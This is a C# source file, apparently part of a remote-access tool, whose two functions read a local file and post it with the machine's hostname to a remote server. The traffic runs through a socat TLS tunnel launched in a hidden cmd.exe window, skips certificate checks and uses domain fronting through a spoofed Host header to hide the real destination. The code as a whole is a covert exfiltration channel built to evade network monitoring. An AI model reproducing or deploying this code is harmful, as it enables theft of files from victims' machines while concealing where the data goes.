using System;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.IO;
using System.Globalization;
using System.Diagnostics;

public partial class Klasy
{
    public static void PostFileFunkcjaHTTPSoverSSL(string front_domain, string real_domain, string url, string dir,
    string plik_url, string postedFileName, string fileName, string hostname)
    {
        try
        {
            IPAddress ip_address;
            if (IPAddress.TryParse(front_domain, out ip_address))
            {
                //Valid IP, with address containing the IP
                front_domain = ip_address.ToString();
            }
            else
            {
                //Invalid IP
                IPHostEntry hostEntry1 = Dns.GetHostEntry(front_domain);
            }

            if (front_domain.Length == 0)
            {
                front_domain = real_domain;
            }

            byte[] plik = File.ReadAllBytes(@plik_url);
            Task<string> task_upload = PostFileHTTPSoverSSL(front_domain, url, real_domain, dir,
                plik, postedFileName, fileName, hostname);
            task_upload.Wait();
#if DEBUG
            Console.WriteLine("### DEBUG (PostFileFunkcja) 010: wyrzucenie na ekran task_upload.Result");
            //wyrzuca na konsole "Success" czyli wynik z funkcjo PostFile:
            Console.WriteLine(task_upload.Result);
            Console.WriteLine("### end DEBUG (PostFileFunkcja) 010\n");
#endif
        }
        catch (SocketException e)
        {
#if DEBUG
            Console.WriteLine("### DEBUG (PostFileFunkcja) 020");
            Console.WriteLine("[ERR0r] SocketException caught!!!");
            Console.WriteLine("[ERR0r] Source : " + e.Source);
            Console.WriteLine("[ERR0r] Message : " + e.Message);
            Console.WriteLine("### end DEBUG (PostFileFunkcja) 020\n");
#endif
        }
        catch (ArgumentNullException e)
        {
#if DEBUG
            Console.WriteLine("### DEBUG (PostFileFunkcja) 030");
            Console.WriteLine("[ERR0r] ArgumentNullException caught!!!");
            Console.WriteLine("[ERR0r] Source : " + e.Source);
            Console.WriteLine("[ERR0r] Message : " + e.Message);
            Console.WriteLine("### end DEBUG (PostFileFunkcja) 030\n");
#endif
        }
        catch (Exception e)
        {
#if DEBUG
            Console.WriteLine("### DEBUG (PostFileFunkcja) 040");
            Console.WriteLine("[ERR0r] Exception caught!!!");
            Console.WriteLine("[ERR0r] Source : " + e.Source);
            Console.WriteLine("[ERR0r] Message : " + e.Message);
            Console.WriteLine("### end DEBUG (PostFileFunkcja) 040\n");
#endif
        }
    }

    static async Task<string> PostFileHTTPSoverSSL(string front_domain, string url, string real_domain, string dir,
        byte[] byteArray, string postedFileName, string fileName, string hostname)
    {
        var tcs = new TaskCompletionSource<string>();
        try
        {
            ProcessStartInfo cmd = new ProcessStartInfo("cmd.exe");
            cmd.RedirectStandardOutput = true;
            cmd.RedirectStandardError = true;
            cmd.CreateNoWindow = true;
            cmd.UseShellExecute = false;
            //string command_arg = "/C socat.exe TCP-LISTEN:28899 OPENSSL:" + front_domain + ":443,verify=0";
            //string command_arg = "/C socat.exe TCP-LISTEN:26899,fork,reuseaddr TCP:" + front_domain + ":443";
            string command_arg = "/C socat.exe TCP-LISTEN:26899 OPENSSL:" + front_domain + ":443,verify=0";
            cmd.Arguments = command_arg;

            Process proc_cmd = Process.Start(cmd);


            using (var client = new HttpClient())
            {
                if (front_domain != real_domain)
                {
                    client.DefaultRequestHeaders.Host = real_domain;
                }
                using (var content = new MultipartFormDataContent("Upload----" +
                    DateTime.Now.ToString(CultureInfo.InvariantCulture)))
                {
                    content.Add(new StreamContent(new MemoryStream(byteArray)),
                        postedFileName, fileName);
                    content.Add(new StringContent(hostname), "Hostname");
                    content.Add(new StringContent(dir), "dir");
                    if (front_domain != real_domain)
                    {
                        client.DefaultRequestHeaders.Host = real_domain;
                    }
                    using (var message = await client.PostAsync("http://localhost:26899/" + url + "?dir=" + dir, content))
                    {
                        var input = await message.Content.ReadAsStringAsync();
#if DEBUG
                        Console.WriteLine("### DEBUG (PostFile) 010");
                        Console.WriteLine(input);
                        Console.WriteLine("### end DEBUG (PostFile) 010\n");
#endif
                        tcs.SetResult("Success");
                    }
                }
            }
        }
        catch (Exception ex)
        {
            tcs.SetResult(ex.Message);
        }
        return await tcs.Task;
    }
}
